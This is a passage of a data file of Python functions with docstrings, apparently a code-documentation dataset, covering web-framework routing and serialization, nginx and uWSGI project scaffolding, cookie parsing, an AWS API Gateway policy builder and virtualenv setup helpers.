            "def send(self, *args, **kwargs):\n        \"\"\"Writes the passed chunk and flushes it to the client.\"\"\"\n        self.write(*args, **kwargs)\n        self.flush()"
        ],
        [
            "def end(self, *args, **kwargs):\n        \"\"\"\n        Writes the passed chunk, flushes it to the client,\n        and terminates the connection.\n        \"\"\"\n        self.send(*args, **kwargs)\n        self.close()"
        ],
        [
            "def replaced_directory(dirname):\n    \"\"\"This ``Context Manager`` is used to move the contents of a directory\n    elsewhere temporarily and put them back upon exit.  This allows testing\n    code to use the same file directories as normal code without fear of\n    damage.\n\n    The name of the temporary directory which contains your files is yielded.\n\n    :param dirname:\n        Path name of the directory to be replaced.\n\n\n    Example:\n\n    .. code-block:: python\n\n        with replaced_directory('/foo/bar/') as rd:\n            # \"/foo/bar/\" has been moved & renamed\n            with open('/foo/bar/thing.txt', 'w') as f:\n                f.write('stuff')\n                f.close()\n\n\n        # got here? => \"/foo/bar/ is now restored and temp has been wiped, \n        # \"thing.txt\" is gone\n    \"\"\"\n    if dirname[-1] == '/':\n        dirname = dirname[:-1]\n\n    full_path = os.path.abspath(dirname)\n    if not os.path.isdir(full_path):\n        raise AttributeError('dir_name must be a directory')\n\n    base, name = os.path.split(full_path)\n\n    # create a temporary directory, move provided dir into it and recreate the\n    # directory for the user\n    tempdir = tempfile.mkdtemp()\n    shutil.move(full_path, tempdir)\n    os.mkdir(full_path)\n    try:\n        yield tempdir\n\n    finally:\n        # done context, undo everything\n        shutil.rmtree(full_path)\n        moved = os.path.join(tempdir, name)\n        shutil.move(moved, base)\n        shutil.rmtree(tempdir)"
        ],
        [
            "def capture_stdout():\n    \"\"\"This ``Context Manager`` redirects STDOUT to a ``StringIO`` objects\n    which is returned from the ``Context``.  On exit STDOUT is restored.\n\n    Example:\n\n    .. code-block:: python\n\n        with capture_stdout() as capture:\n            print('foo')\n\n        # got here? => capture.getvalue() will now have \"foo\\\\n\"\n    \"\"\"\n    stdout = sys.stdout\n    try:\n        capture_out = StringIO()\n        sys.stdout = capture_out\n        yield capture_out\n    finally:\n        sys.stdout = stdout"
        ],
        [
            "def capture_stderr():\n    \"\"\"This ``Context Manager`` redirects STDERR to a ``StringIO`` objects\n    which is returned from the ``Context``.  On exit STDERR is restored.\n\n    Example:\n\n    .. code-block:: python\n\n        with capture_stderr() as capture:\n            print('foo')\n\n        # got here? => capture.getvalue() will now have \"foo\\\\n\"\n    \"\"\"\n    stderr = sys.stderr\n    try:\n        capture_out = StringIO()\n        sys.stderr = capture_out\n        yield capture_out\n    finally:\n        sys.stderr = stderr"
        ],
        [
            "def urls(cls):\n        \"\"\"Builds the URL configuration for this resource.\"\"\"\n        return urls.patterns('', urls.url(\n            r'^{}(?:$|(?P<path>[/:(.].*))'.format(cls.meta.name),\n            cls.view,\n            name='armet-api-{}'.format(cls.meta.name),\n            kwargs={'resource': cls.meta.name}))"
        ],
        [
            "def dump(obj, fp, startindex=1, separator=DEFAULT, index_separator=DEFAULT):\n    '''Dump an object in req format to the fp given.\n\n    :param Mapping obj: The object to serialize.  Must have a keys method.\n    :param fp: A writable that can accept all the types given.\n    :param separator: The separator between key and value.  Defaults to u'|' or b'|', depending on the types.\n    :param index_separator: The separator between key and index.  Defaults to u'_' or b'_', depending on the types.\n    '''\n\n    if startindex < 0:\n        raise ValueError('startindex must be non-negative, but was {}'.format(startindex))\n\n    try:\n        firstkey = next(iter(obj.keys()))\n    except StopIteration:\n        return\n\n    if isinstance(firstkey, six.text_type):\n        converter = six.u\n    else:\n        converter = six.b\n\n    default_separator = converter('|')\n    default_index_separator = converter('_')\n    newline = converter('\\n')\n\n    if separator is DEFAULT:\n        separator = default_separator\n    if index_separator is DEFAULT:\n        index_separator = default_index_separator\n\n    for key, value in six.iteritems(obj):\n        if isinstance(value, (list, tuple, set)):\n            for index, item in enumerate(value, start=startindex):\n                fp.write(key)\n                fp.write(index_separator)\n                fp.write(converter(str(index)))\n                fp.write(separator)\n                fp.write(item)\n                fp.write(newline)\n        else:\n            fp.write(key)\n            fp.write(separator)\n            fp.write(value)\n            fp.write(newline)"
        ],
        [
            "def dumps(obj, startindex=1, separator=DEFAULT, index_separator=DEFAULT):\n    '''Dump an object in req format to a string.\n\n    :param Mapping obj: The object to serialize.  Must have a keys method.\n    :param separator: The separator between key and value.  Defaults to u'|' or b'|', depending on the types.\n    :param index_separator: The separator between key and index.  Defaults to u'_' or b'_', depending on the types.\n    '''\n\n    try:\n        firstkey = next(iter(obj.keys()))\n    except StopIteration:\n        return str()\n\n    if isinstance(firstkey, six.text_type):\n        io = StringIO()\n    else:\n        io = BytesIO()\n\n    dump(\n        obj=obj,\n        fp=io,\n        startindex=startindex,\n        separator=separator,\n        index_separator=index_separator,\n        )\n    return io.getvalue()"
        ],
        [
            "def load(fp, separator=DEFAULT, index_separator=DEFAULT, cls=dict, list_cls=list):\n    '''Load an object from the file pointer.\n\n    :param fp: A readable filehandle.\n    :param separator: The separator between key and value.  Defaults to u'|' or b'|', depending on the types.\n    :param index_separator: The separator between key and index.  Defaults to u'_' or b'_', depending on the types.\n    :param cls: A callable that returns a Mapping that is filled with pairs.  The most common alternate option would be OrderedDict.\n    :param list_cls: A callable that takes an iterable and returns a sequence.\n    '''\n\n    converter = None\n\n    output = cls()\n    arraykeys = set()\n\n    for line in fp:\n        if converter is None:\n            if isinstance(line, six.text_type):\n                converter = six.u\n            else:\n                converter = six.b\n            default_separator = converter('|')\n            default_index_separator = converter('_')\n            newline = converter('\\n')\n\n            if separator is DEFAULT:\n                separator = default_separator\n            if index_separator is DEFAULT:\n                index_separator = default_index_separator\n\n        key, value = line.strip().split(separator, 1)\n\n        keyparts = key.split(index_separator)\n\n        try:\n            index = int(keyparts[-1])\n            endwithint = True\n        except ValueError:\n            endwithint = False\n\n        # We do everything in-place to ensure that we maintain order when using\n        # an OrderedDict.\n        if len(keyparts) > 1 and endwithint:\n            # If this is an array key\n            basekey = key.rsplit(index_separator, 1)[0]\n            if basekey not in arraykeys:\n                arraykeys.add(basekey)\n\n            if basekey in output:\n                # If key already exists as non-array, fix it\n                if not isinstance(output[basekey], dict):\n                    output[basekey] = {-1: output[basekey]}\n            else:\n                output[basekey] = {}\n\n            output[basekey][index] = value\n\n        else:\n            if key in output and isinstance(output[key], dict):\n                output[key][-1] = value\n            else:\n                output[key] = value\n\n    # Convert array keys\n    for key in arraykeys:\n        output[key] = list_cls(pair[1] for pair in sorted(six.iteritems(output[key])))\n\n    return output"
        ],
        [
            "def loads(s, separator=DEFAULT, index_separator=DEFAULT, cls=dict, list_cls=list):\n    '''Loads an object from a string.\n\n    :param s: An object to parse\n    :type s: bytes or str\n    :param separator: The separator between key and value.  Defaults to u'|' or b'|', depending on the types.\n    :param index_separator: The separator between key and index.  Defaults to u'_' or b'_', depending on the types.\n    :param cls: A callable that returns a Mapping that is filled with pairs.  The most common alternate option would be OrderedDict.\n    :param list_cls: A callable that takes an iterable and returns a sequence.\n    '''\n\n    if isinstance(s, six.text_type):\n        io = StringIO(s)\n    else:\n        io = BytesIO(s)\n\n    return load(\n        fp=io,\n        separator=separator,\n        index_separator=index_separator,\n        cls=cls,\n        list_cls=list_cls,\n        )"
        ],
        [
            "def reverse(self):\n        \"\"\" Reverse all bumpers \"\"\"\n        if not self.test_drive and self.bumps:\n            map(lambda b: b.reverse(), self.bumpers)"
        ],
        [
            "def _expand_targets(self, targets, base_dir=None):\n        \"\"\" Expand targets by looking for '-r' in targets. \"\"\"\n        all_targets = []\n\n        for target in targets:\n            target_dirs = [p for p in [base_dir, os.path.dirname(target)] if p]\n            target_dir = target_dirs and os.path.join(*target_dirs) or ''\n            target = os.path.basename(target)\n            target_path = os.path.join(target_dir, target)\n\n            if os.path.exists(target_path):\n                all_targets.append(target_path)\n\n                with open(target_path) as fp:\n                    for line in fp:\n                        if line.startswith('-r '):\n                            _, new_target = line.split(' ', 1)\n                            all_targets.extend(self._expand_targets([new_target.strip()], base_dir=target_dir))\n\n        return all_targets"
        ],
        [
            "def get_nginx_config(self):\n        \"\"\"\n        Gets the Nginx config for the project\n\n        \"\"\"\n        if os.path.exists(self._nginx_config):\n            return open(self._nginx_config, 'r').read()\n        else:\n            return None"
        ],
        [
            "def check_directories(self):\n        \"\"\"\n        Creates base directories for app, virtualenv, and nginx\n\n        \"\"\"\n        self.log.debug('Checking directories')\n        if not os.path.exists(self._ve_dir):\n            os.makedirs(self._ve_dir)\n        if not os.path.exists(self._app_dir):\n            os.makedirs(self._app_dir)\n        if not os.path.exists(self._conf_dir):\n            os.makedirs(self._conf_dir)\n        if not os.path.exists(self._var_dir):\n            os.makedirs(self._var_dir)\n        if not os.path.exists(self._log_dir):\n            os.makedirs(self._log_dir)\n        if not os.path.exists(self._script_dir):\n            os.makedirs(self._script_dir)\n\n        # copy uswgi_params for nginx\n        uwsgi_params = '/etc/nginx/uwsgi_params'\n        if os.path.exists(uwsgi_params):\n            shutil.copy(uwsgi_params, self._conf_dir)\n        else:\n            logging.warning('Unable to find Nginx uwsgi_params.  You must manually copy this to {0}.'.format(self._conf_dir))\n\n        # copy mime.types for nginx\n        mime_types = '/etc/nginx/mime.types'\n        if os.path.exists(mime_types):\n            shutil.copy(mime_types, self._conf_dir)\n            self._include_mimetypes = True\n        else:\n            logging.warn('Unable to find mime.types for Nginx.  You must manually copy this to {0}.'.format(self._conf_dir))"
        ],
        [
            "def create_virtualenv(self):\n        \"\"\"\n        Creates the virtualenv for the project\n        \n        \"\"\"\n        if check_command('virtualenv'):\n            ve_dir = os.path.join(self._ve_dir, self._project_name)\n            if os.path.exists(ve_dir):\n                if self._force:\n                    logging.warn('Removing existing virtualenv')\n                    shutil.rmtree(ve_dir)\n                else:\n                    logging.warn('Found existing virtualenv; not creating (use --force to overwrite)')\n                    return\n            logging.info('Creating virtualenv')\n            p = subprocess.Popen('virtualenv --no-site-packages {0} > /dev/null'.format(ve_dir), shell=True)\n            os.waitpid(p.pid, 0)\n            # install modules\n            for m in self._modules:\n                self.log.info('Installing module {0}'.format(m))\n                p = subprocess.Popen('{0} install {1} > /dev/null'.format(os.path.join(self._ve_dir, \\\n                self._project_name) + os.sep + 'bin' + os.sep + 'pip', m), shell=True)\n                os.waitpid(p.pid, 0)"
        ],
        [
            "def create_nginx_config(self):\n        \"\"\"\n        Creates the Nginx configuration for the project\n\n        \"\"\"\n        cfg = '# nginx config for {0}\\n'.format(self._project_name)\n        if not self._shared_hosting:\n            # user\n            if self._user:\n                cfg += 'user {0};\\n'.format(self._user)\n            # misc nginx config\n            cfg += 'worker_processes 1;\\nerror_log {0}-errors.log;\\n\\\npid {1}_    nginx.pid;\\n\\n'.format(os.path.join(self._log_dir, \\\n                self._project_name), os.path.join(self._var_dir, self._project_name))\n            cfg += 'events {\\n\\tworker_connections 32;\\n}\\n\\n'\n            # http section\n            cfg += 'http {\\n'\n            if self._include_mimetypes:\n                cfg += '\\tinclude mime.types;\\n'\n            cfg += '\\tdefault_type application/octet-stream;\\n'\n            cfg += '\\tclient_max_body_size 1G;\\n'\n            cfg += '\\tproxy_max_temp_file_size 0;\\n'\n            cfg += '\\tproxy_buffering off;\\n'\n            cfg += '\\taccess_log {0}-access.log;\\n'.format(os.path.join \\\n                (self._log_dir, self._project_name))\n            cfg += '\\tsendfile on;\\n'\n            cfg += '\\tkeepalive_timeout 65;\\n'\n            # server section\n        cfg += '\\tserver {\\n'\n        cfg += '\\t\\tlisten 0.0.0.0:{0};\\n'.format(self._port)\n        if self._server_name:\n            cfg += '\\t\\tserver_name {0};\\n'.format(self._server_name)\n        # location section\n        cfg += '\\t\\tlocation / {\\n'\n        cfg += '\\t\\t\\tuwsgi_pass unix:///{0}.sock;\\n'.format(\\\n            os.path.join(self._var_dir, self._project_name))\n        cfg += '\\t\\t\\tinclude uwsgi_params;\\n'\n        cfg += '\\t\\t}\\n\\n'\n        # end location\n        # error page templates\n        cfg += '\\t\\terror_page 500 502 503 504 /50x.html;\\n'\n        cfg += '\\t\\tlocation = /50x.html {\\n'\n        cfg += '\\t\\t\\troot html;\\n'\n        # end error page section\n        cfg += '\\t\\t}\\n'\n        # end server section\n        cfg += '\\t}\\n'\n        if not self._shared_hosting:\n            # end http section\n            cfg += '}\\n'\n\n        # create conf\n        f = open(self._nginx_config, 'w')\n        f.write(cfg)\n        f.close()"
        ],
        [
            "def create_manage_scripts(self):\n        \"\"\"\n        Creates scripts to start and stop the application\n\n        \"\"\"\n        # create start script\n        start = '# start script for {0}\\n\\n'.format(self._project_name)\n        # start uwsgi\n        start += 'echo \\'Starting uWSGI...\\'\\n'\n        start += 'sh {0}.uwsgi\\n'.format(os.path.join(self._conf_dir, self._project_name))\n        start += 'sleep 1\\n'\n        # start nginx\n        start += 'echo \\'Starting Nginx...\\'\\n'\n        start += 'nginx -c {0}_nginx.conf\\n'.format(os.path.join(self._conf_dir, self._project_name))\n        start += 'sleep 1\\n'\n        start += 'echo \\'{0} started\\'\\n\\n'.format(self._project_name)\n\n        # stop script\n        stop = '# stop script for {0}\\n\\n'.format(self._project_name)\n        # stop nginx\n        stop += 'if [ -e {0}_nginx.pid ]; then nginx -c {1}_nginx.conf -s stop ; fi\\n'.format(os.path.join(self._var_dir, self._project_name), os.path.join(self._conf_dir, self._project_name))\n        # stop uwsgi\n        stop += 'if [ -e {0}_uwsgi.pid ]; then kill -9 `cat {0}_uwsgi.pid` ; rm {0}_uwsgi.pid 2>&1 > /dev/null ; fi\\n'.format(os.path.join(self._var_dir, self._project_name))\n        stop += 'echo \\'{0} stopped\\'\\n'.format(self._project_name)\n\n        # write scripts\n        start_file = '{0}_start.sh'.format(os.path.join(self._script_dir, self._project_name))\n        stop_file = '{0}_stop.sh'.format(os.path.join(self._script_dir, self._project_name))\n        f = open(start_file, 'w')\n        f.write(start)\n        f.close()\n        f = open(stop_file, 'w')\n        f.write(stop)\n        f.close()\n        # make executable\n        os.chmod(start_file, 0754)\n        os.chmod(stop_file, 0754)"
        ],
        [
            "def create(self):\n        \"\"\"\n        Creates the full project\n\n        \"\"\"\n        # create virtualenv\n        self.create_virtualenv()\n        # create project\n        self.create_project()\n        # generate uwsgi script\n        self.create_uwsgi_script()\n        # generate nginx config\n        self.create_nginx_config()\n        # generate management scripts\n        self.create_manage_scripts()\n        logging.info('** Make sure to set proper permissions for the webserver user account on the var and log directories in the project root')"
        ],
        [
            "def dasherize(value):\n    \"\"\"Dasherizes the passed value.\"\"\"\n    value = value.strip()\n    value = re.sub(r'([A-Z])', r'-\\1', value)\n    value = re.sub(r'[-_\\s]+', r'-', value)\n    value = re.sub(r'^-', r'', value)\n    value = value.lower()\n    return value"
        ],
        [
            "def redirect(cls, request, response):\n        \"\"\"Redirect to the canonical URI for this resource.\"\"\"\n        if cls.meta.legacy_redirect:\n            if request.method in ('GET', 'HEAD',):\n                # A SAFE request is allowed to redirect using a 301\n                response.status = http.client.MOVED_PERMANENTLY\n\n            else:\n                # All other requests must use a 307\n                response.status = http.client.TEMPORARY_REDIRECT\n\n        else:\n            # Modern redirects are allowed. Let's have some fun.\n            # Hopefully you're client supports this.\n            # The RFC explicitly discourages UserAgent sniffing.\n            response.status = http.client.PERMANENT_REDIRECT\n\n        # Terminate the connection.\n        response.close()"
        ],
        [
            "def parse(cls, path):\n        \"\"\"Parses out parameters and separates them out of the path.\n\n        This uses one of the many defined patterns on the options class. But,\n        it defaults to a no-op if there are no defined patterns.\n        \"\"\"\n        # Iterate through the available patterns.\n        for resource, pattern in cls.meta.patterns:\n            # Attempt to match the path.\n            match = re.match(pattern, path)\n            if match is not None:\n                # Found something.\n                return resource, match.groupdict(), match.string[match.end():]\n\n        # No patterns at all; return unsuccessful.\n        return None if not cls.meta.patterns else False"
        ],
        [
            "def traverse(cls, request, params=None):\n        \"\"\"Traverses down the path and determines the accessed resource.\n\n        This makes use of the patterns array to implement simple traversal.\n        This defaults to a no-op if there are no defined patterns.\n        \"\"\"\n        # Attempt to parse the path using a pattern.\n        result = cls.parse(request.path)\n        if result is None:\n            # No parsing was requested; no-op.\n            return cls, {}\n\n        elif not result:\n            # Parsing failed; raise 404.\n            raise http.exceptions.NotFound()\n\n        # Partition out the result.\n        resource, data, rest = result\n\n        if params:\n            # Append params to data.\n            data.update(params)\n\n        if resource is None:\n            # No traversal; return parameters.\n            return cls, data\n\n        # Modify the path appropriately.\n        if data.get('path') is not None:\n            request.path = data.pop('path')\n\n        elif rest is not None:\n            request.path = rest\n\n        # Send us through traversal again.\n        result = resource.traverse(request, params=data)\n        return result"
        ],
        [
            "def stream(cls, response, sequence):\n        \"\"\"\n        Helper method used in conjunction with the view handler to\n        stream responses to the client.\n        \"\"\"\n        # Construct the iterator and run the sequence once in order\n        # to capture any headers and status codes set.\n        iterator = iter(sequence)\n        data = {'chunk': next(iterator)}\n        response.streaming = True\n\n        def streamer():\n            # Iterate through the iterator and yield its content\n            while True:\n                if response.asynchronous:\n                    # Yield our current chunk.\n                    yield data['chunk']\n\n                else:\n                    # Write the chunk to the response\n                    response.send(data['chunk'])\n\n                    # Yield its body\n                    yield response.body\n\n                    # Unset the body.\n                    response.body = None\n\n                try:\n                    # Get the next chunk.\n                    data['chunk'] = next(iterator)\n\n                except StopIteration:\n                    # Get out of the loop.\n                    break\n\n            if not response.asynchronous:\n                # Close the response.\n                response.close()\n\n        # Return the streaming function.\n        return streamer()"
        ],
        [
            "def deserialize(self, request=None, text=None, format=None):\n        \"\"\"Deserializes the text using a determined deserializer.\n\n        @param[in] request\n            The request object to pull information from; normally used to\n            determine the deserialization format (when `format` is\n            not provided).\n\n        @param[in] text\n            The text to be deserialized. Can be left blank and the\n            request will be read.\n\n        @param[in] format\n            A specific format to deserialize in; if provided, no detection is\n            done. If not provided, the content-type header is looked at to\n            determine an appropriate deserializer.\n\n        @returns\n            A tuple of the deserialized data and an instance of the\n            deserializer used.\n        \"\"\"\n        if isinstance(self, Resource):\n            if not request:\n                # Ensure we have a response object.\n                request = self._request\n\n        Deserializer = None\n        if format:\n            # An explicit format was given; do not attempt to auto-detect\n            # a deserializer.\n            Deserializer = self.meta.deserializers[format]\n\n        if not Deserializer:\n            # Determine an appropriate deserializer to use by\n            # introspecting the request object and looking at\n            # the `Content-Type` header.\n            media_ranges = request.get('Content-Type')\n            if media_ranges:\n                # Parse the media ranges and determine the deserializer\n                # that is the closest match.\n                media_types = six.iterkeys(self._deserializer_map)\n                media_type = mimeparse.best_match(media_types, media_ranges)\n                if media_type:\n                    format = self._deserializer_map[media_type]\n                    Deserializer = self.meta.deserializers[format]\n\n            else:\n                # Client didn't provide a content-type; we're supposed\n                # to auto-detect.\n                # TODO: Implement this.\n                pass\n\n        if Deserializer:\n            try:\n                # Attempt to deserialize the data using the determined\n                # deserializer.\n                deserializer = Deserializer()\n                data = deserializer.deserialize(request=request, text=text)\n                return data, deserializer\n\n            except ValueError:\n                # Failed to deserialize the data.\n                pass\n\n        # Failed to determine a deserializer; or failed to deserialize.\n        raise http.exceptions.UnsupportedMediaType()"
        ],
        [
            "def serialize(self, data, response=None, request=None, format=None):\n        \"\"\"Serializes the data using a determined serializer.\n\n        @param[in] data\n            The data to be serialized.\n\n        @param[in] response\n            The response object to serialize the data to.\n            If this method is invoked as an instance method, the response\n            object can be omitted and it will be taken from the instance.\n\n        @param[in] request\n            The request object to pull information from; normally used to\n            determine the serialization format (when `format` is not provided).\n            May be used by some serializers as well to pull additional headers.\n            If this method is invoked as an instance method, the request\n            object can be omitted and it will be taken from the instance.\n\n        @param[in] format\n            A specific format to serialize in; if provided, no detection is\n            done. If not provided, the accept header (as well as the URL\n            extension) is looked at to determine an appropriate serializer.\n\n        @returns\n            A tuple of the serialized text and an instance of the\n            serializer used.\n        \"\"\"\n        if isinstance(self, Resource):\n            if not request:\n                # Ensure we have a response object.\n                request = self._request\n\n        Serializer = None\n        if format:\n            # An explicit format was given; do not attempt to auto-detect\n            # a serializer.\n            Serializer = self.meta.serializers[format]\n\n        if not Serializer:\n            # Determine an appropriate serializer to use by\n            # introspecting the request object and looking at the `Accept`\n            # header.\n            media_ranges = (request.get('Accept') or '*/*').strip()\n            if not media_ranges:\n                # Default the media ranges to */*\n                media_ranges = '*/*'\n\n            if media_ranges != '*/*':\n                # Parse the media ranges and determine the serializer\n                # that is the closest match.\n                media_types = six.iterkeys(self._serializer_map)\n                media_type = mimeparse.best_match(media_types, media_ranges)\n                if media_type:\n                    format = self._serializer_map[media_type]\n                    Serializer = self.meta.serializers[format]\n\n            else:\n                # Client indicated no preference; use the default.\n                default = self.meta.default_serializer\n                Serializer = self.meta.serializers[default]\n\n        if Serializer:\n            try:\n                # Attempt to serialize the data using the determined\n                # serializer.\n                serializer = Serializer(request, response)\n                return serializer.serialize(data), serializer\n\n            except ValueError:\n                # Failed to serialize the data.\n                pass\n\n        # Either failed to determine a serializer or failed to serialize\n        # the data; construct a list of available and valid encoders.\n        available = {}\n        for name in self.meta.allowed_serializers:\n            Serializer = self.meta.serializers[name]\n            instance = Serializer(request, None)\n            if instance.can_serialize(data):\n                available[name] = Serializer.media_types[0]\n\n        # Raise a Not Acceptable exception.\n        raise http.exceptions.NotAcceptable(available)"
        ],
        [
            "def dispatch(self, request, response):\n        \"\"\"Entry-point of the dispatch cycle for this resource.\n\n        Performs common work such as authentication, decoding, etc. before\n        handing complete control of the result to a function with the\n        same name as the request method.\n        \"\"\"\n        # Assert authentication and attempt to get a valid user object.\n        self.require_authentication(request)\n\n        # Assert accessibiltiy of the resource in question.\n        self.require_accessibility(request.user, request.method)\n\n        # Facilitate CORS by applying various headers.\n        # This must be done on every request.\n        # TODO: Provide cross_domain configuration that turns this off.\n        self._process_cross_domain_request(request, response)\n\n        # Route the HTTP/1.1 request to an appropriate method.\n        return self.route(request, response)"
        ],
        [
            "def require_authentication(self, request):\n        \"\"\"Ensure we are authenticated.\"\"\"\n        request.user = user = None\n\n        if request.method == 'OPTIONS':\n            # Authentication should not be checked on an OPTIONS request.\n            return\n\n        for auth in self.meta.authentication:\n            user = auth.authenticate(request)\n            if user is False:\n                # Authentication protocol failed to authenticate;\n                # pass the baton.\n                continue\n\n            if user is None and not auth.allow_anonymous:\n                # Authentication protocol determined the user is\n                # unauthenticated.\n                auth.unauthenticated()\n\n            # Authentication protocol determined the user is indeed\n            # authenticated (or not); Store the user for later reference.\n            request.user = user\n            return\n\n        if not user and not auth.allow_anonymous:\n            # No authenticated user found and protocol doesn't allow\n            # anonymous users.\n            auth.unauthenticated()"
        ],
        [
            "def require_accessibility(self, user, method):\n        \"\"\"Ensure we are allowed to access this resource.\"\"\"\n        if method == 'OPTIONS':\n            # Authorization should not be checked on an OPTIONS request.\n            return\n\n        authz = self.meta.authorization\n        if not authz.is_accessible(user, method, self):\n            # User is not authorized; raise an appropriate message.\n            authz.unaccessible()"
        ],
        [
            "def require_http_allowed_method(cls, request):\n        \"\"\"Ensure that we're allowed to use this HTTP method.\"\"\"\n        allowed = cls.meta.http_allowed_methods\n        if request.method not in allowed:\n            # The specified method is not allowed for the resource\n            # identified by the request URI.\n            # RFC 2616 \u00a7 10.4.6 \u2014 405 Method Not Allowed\n            raise http.exceptions.MethodNotAllowed(allowed)"
        ],
        [
            "def route(self, request, response):\n        \"\"\"Processes every request.\n\n        Directs control flow to the appropriate HTTP/1.1 method.\n        \"\"\"\n        # Ensure that we're allowed to use this HTTP method.\n        self.require_http_allowed_method(request)\n\n        # Retrieve the function corresponding to this HTTP method.\n        function = getattr(self, request.method.lower(), None)\n        if function is None:\n            # Server is not capable of supporting it.\n            raise http.exceptions.NotImplemented()\n\n        # Delegate to the determined function to process the request.\n        return function(request, response)"
        ],
        [
            "def options(self, request, response):\n        \"\"\"Process an `OPTIONS` request.\n\n        Used to initiate a cross-origin request. All handling specific to\n        CORS requests is done on every request however this method also\n        returns a list of available methods.\n        \"\"\"\n        # Gather a list available HTTP/1.1 methods for this URI.\n        response['Allowed'] = ', '.join(self.meta.http_allowed_methods)\n\n        # All CORS handling is done for every HTTP/1.1 method.\n        # No more handling is neccesary; set the response to 200 and return.\n        response.status = http.client.OK"
        ],
        [
            "def resource(**kwargs):\n    \"\"\"Wraps the decorated function in a lightweight resource.\"\"\"\n    def inner(function):\n        name = kwargs.pop('name', None)\n        if name is None:\n            name = utils.dasherize(function.__name__)\n\n        methods = kwargs.pop('methods', None)\n        if isinstance(methods, six.string_types):\n            # Tuple-ify the method if we got just a string.\n            methods = methods,\n\n        # Construct a handler.\n        handler = (function, methods)\n\n        if name not in _resources:\n            # Initiate the handlers list.\n            _handlers[name] = []\n\n            # Construct a light-weight resource using the passed kwargs\n            # as the arguments for the meta.\n            from armet import resources\n            kwargs['name'] = name\n\n            class LightweightResource(resources.Resource):\n                Meta = type(str('Meta'), (), kwargs)\n\n                def route(self, request, response):\n                    for handler, methods in _handlers[name]:\n                        if methods is None or request.method in methods:\n                            return handler(request, response)\n\n                    resources.Resource.route(self)\n\n            # Construct and add this resource.\n            _resources[name] = LightweightResource\n\n        # Add this to the handlers.\n        _handlers[name].append(handler)\n\n        # Return the resource.\n        return _resources[name]\n\n    # Return the inner method.\n    return inner"
        ],
        [
            "def render_to_string(self):\n        \"\"\"Render to cookie strings.\n        \"\"\"\n        values = ''\n        for key, value in self.items():\n            values += '{}={};'.format(key, value)\n        return values"
        ],
        [
            "def from_cookie_string(self, cookie_string):\n        \"\"\"update self with cookie_string.\n        \"\"\"\n        for key_value in cookie_string.split(';'):\n            if '=' in key_value:\n                key, value = key_value.split('=', 1)\n            else:\n                key = key_value\n            strip_key = key.strip()\n            if strip_key and strip_key.lower() not in COOKIE_ATTRIBUTE_NAMES:\n                self[strip_key] = value.strip()"
        ],
        [
            "def _add_method(self, effect, verb, resource, conditions):\n        \"\"\"\n        Adds a method to the internal lists of allowed or denied methods.\n        Each object in the internal list contains a resource ARN and a\n        condition statement. The condition statement can be null.\n        \"\"\"\n        if verb != '*' and not hasattr(HttpVerb, verb):\n            raise NameError('Invalid HTTP verb ' + verb +\n                            '. Allowed verbs in HttpVerb class')\n        resource_pattern = re.compile(self.path_regex)\n        if not resource_pattern.match(resource):\n            raise NameError('Invalid resource path: ' + resource +\n                            '. Path should match ' + self.path_regex)\n\n        if resource[:1] == '/':\n            resource = resource[1:]\n\n        resource_arn = ('arn:aws:execute-api:' +\n                        self.region + ':' +\n                        self.aws_account_id + ':' +\n                        self.rest_api_id + '/' +\n                        self.stage + '/' +\n                        verb + '/' +\n                        resource)\n\n        if effect.lower() == 'allow':\n            self.allowMethods.append({\n                'resource_arn': resource_arn,\n                'conditions': conditions\n            })\n        elif effect.lower() == 'deny':\n            self.denyMethods.append({\n                'resource_arn': resource_arn,\n                'conditions': conditions\n            })"
        ],
        [
            "def _get_effect_statement(self, effect, methods):\n        \"\"\"\n        This function loops over an array of objects containing\n        a resourceArn and conditions statement and generates\n        the array of statements for the policy.\n        \"\"\"\n        statements = []\n\n        if len(methods) > 0:\n            statement = self._get_empty_statement(effect)\n\n            for method in methods:\n                if (method['conditions'] is None or\n                        len(method['conditions']) == 0):\n                    statement['Resource'].append(method['resource_arn'])\n                else:\n                    cond_statement = self._get_empty_statement(effect)\n                    cond_statement['Resource'].append(method['resource_arn'])\n                    cond_statement['Condition'] = method['conditions']\n                    statements.append(cond_statement)\n            statements.append(statement)\n\n        return statements"
        ],
        [
            "def deref(self, data):\n        \"\"\"AWS doesn't quite have Swagger 2.0 validation right and will fail\n        on some refs. So, we need to convert to deref before\n        upload.\"\"\"\n\n        # We have to make a deepcopy here to create a proper JSON\n        # compatible object, otherwise `json.dumps` fails when it\n        # hits jsonref.JsonRef objects.\n        deref = copy.deepcopy(jsonref.JsonRef.replace_refs(data))\n\n        # Write out JSON version because we might want this.\n        self.write_template(deref, filename='swagger.json')\n\n        return deref"
        ],
        [
            "def check_pre_requirements(pre_requirements):\n    \"\"\"Check all necessary system requirements to exist.\n\n    :param pre_requirements:\n        Sequence of pre-requirements to check by running\n        ``where <pre_requirement>`` on Windows and ``which ...`` elsewhere.\n    \"\"\"\n    pre_requirements = set(pre_requirements or [])\n    pre_requirements.add('virtualenv')\n\n    for requirement in pre_requirements:\n        if not which(requirement):\n            print_error('Requirement {0!r} is not found in system'.\n                        format(requirement))\n            return False\n\n    return True"
        ],
        [
            "def config_to_args(config):\n    \"\"\"Convert config dict to arguments list.\n\n    :param config: Configuration dict.\n    \"\"\"\n    result = []\n\n    for key, value in iteritems(config):\n        if value is False:\n            continue\n\n        key = '--{0}'.format(key.replace('_', '-'))\n\n        if isinstance(value, (list, set, tuple)):\n            for item in value:\n                result.extend((key, smart_str(item)))\n        elif value is not True:\n            result.extend((key, smart_str(value)))\n        else:\n            result.append(key)\n\n    return tuple(result)"
        ],
        [
            "def create_env(env, args, recreate=False, ignore_activated=False, quiet=False):\n    \"\"\"Create virtual environment.\n\n    :param env: Virtual environment name.\n    :param args: Pass given arguments to ``virtualenv`` script.\n    :param recerate: Recreate virtual environment? By default: False\n    :param ignore_activated:\n        Ignore already activated virtual environment and create new one. By\n        default: False\n    :param quiet: Do not output messages into terminal. By default: False\n    \"\"\"\n    cmd = None\n    result = True\n\n    inside_env = hasattr(sys, 'real_prefix') or os.environ.get('VIRTUAL_ENV')\n    env_exists = os.path.isdir(env)\n\n    if not quiet:\n        print_message('== Step 1. Create virtual environment ==')\n\n    if (\n        recreate or (not inside_env and not env_exists)\n    ) or (\n        ignore_activated and not env_exists\n    ):\n        cmd = ('virtualenv', ) + args + (env, )\n\n    if not cmd and not quiet:\n        if inside_env:\n            message = 'Working inside of virtual environment, done...'\n        else:\n            message = 'Virtual environment {0!r} already created, done...'\n        print_message(message.format(env))\n\n    if cmd:\n        with disable_error_handler():\n            result = not run_cmd(cmd, echo=not quiet)\n\n    if not quiet:\n        